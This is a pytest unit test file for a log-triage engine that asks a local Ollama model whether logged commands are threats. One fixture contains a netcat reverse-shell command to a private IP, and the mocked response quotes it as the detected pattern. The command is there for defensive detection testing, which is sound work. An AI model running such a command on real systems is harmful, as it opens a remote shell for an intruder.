"""
Unit tests for Primary Ollama Open-Weight LLM Triage Engine (`src/blackwall/enterprise/forensics/ollama_engine.py`).
"""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from blackwall.enterprise.forensics.ollama_engine import OllamaForensicEngine


def _create_mock_session(response_mock=None, side_effect=None):
    session_mock = MagicMock()
    session_mock.__aenter__ = AsyncMock(return_value=session_mock)
    session_mock.__aexit__ = AsyncMock(return_value=None)

    if side_effect:
        session_mock.get.side_effect = side_effect
        session_mock.post.side_effect = side_effect
    elif response_mock:
        cm = MagicMock()
        cm.__aenter__ = AsyncMock(return_value=response_mock)
        cm.__aexit__ = AsyncMock(return_value=None)
        session_mock.get.return_value = cm
        session_mock.post.return_value = cm

    return session_mock


@pytest.mark.asyncio
async def test_ollama_is_online_success():
    engine = OllamaForensicEngine(endpoint="http://localhost:11434")

    mock_response = MagicMock()
    mock_response.status = 200

    session_mock = _create_mock_session(response_mock=mock_response)

    with patch("aiohttp.ClientSession", return_value=session_mock):
        is_online = await engine.is_ollama_online()
        assert is_online


@pytest.mark.asyncio
async def test_ollama_is_online_failure():
    engine = OllamaForensicEngine(endpoint="http://localhost:11434")

    session_mock = _create_mock_session(side_effect=Exception("Connection refused"))

    with patch("aiohttp.ClientSession", return_value=session_mock):
        is_online = await engine.is_ollama_online()
        assert not is_online


@pytest.mark.asyncio
async def test_ollama_analyze_log_stream_success():
    engine = OllamaForensicEngine(endpoint="http://localhost:11434", model="qwen3:8b")

    mock_json_data = {
        "response": '{"is_threat": true, "threat_level": "CRITICAL", "description": "Reverse shell attempt detected", "extracted_pattern": "nc -e /bin/sh"}'
    }
    mock_response = MagicMock()
    mock_response.status = 200
    mock_response.json = AsyncMock(return_value=mock_json_data)

    session_mock = _create_mock_session(response_mock=mock_response)

    log_payload = {
        "timestamp": "2026-07-23T07:35:00Z",
        "command": "/bin/nc -e /bin/sh 10.0.0.5 4444",
        "pid": 9901,
    }

    with patch("aiohttp.ClientSession", return_value=session_mock):
        report = await engine.analyze_log_stream(log_payload)
        assert report["is_threat"] is True
        assert report["threat_level"] == "CRITICAL"
        assert report["mode"] == "ollama_primary"
        assert report["model"] == "qwen3:8b"
        assert "nc -e /bin/sh" in report["extracted_pattern"]


@pytest.mark.asyncio
async def test_ollama_analyze_log_stream_prose_benign_fallback():
    engine = OllamaForensicEngine(endpoint="http://localhost:11434", model="qwen3:8b")

    # Benign prose response without valid JSON formatting
    mock_json_data = {"response": "No threat detected in event log."}
    mock_response = MagicMock()
    mock_response.status = 200
    mock_response.json = AsyncMock(return_value=mock_json_data)

    session_mock = _create_mock_session(response_mock=mock_response)

    log_payload = {
        "timestamp": "2026-07-23T09:00:00Z",
        "command": "python3 main.py",
    }

    with patch("aiohttp.ClientSession", return_value=session_mock):
        report = await engine.analyze_log_stream(log_payload)
        assert report["is_threat"] is False
        assert report["threat_level"] == "LOW"
        assert report["mode"] == "ollama_primary"
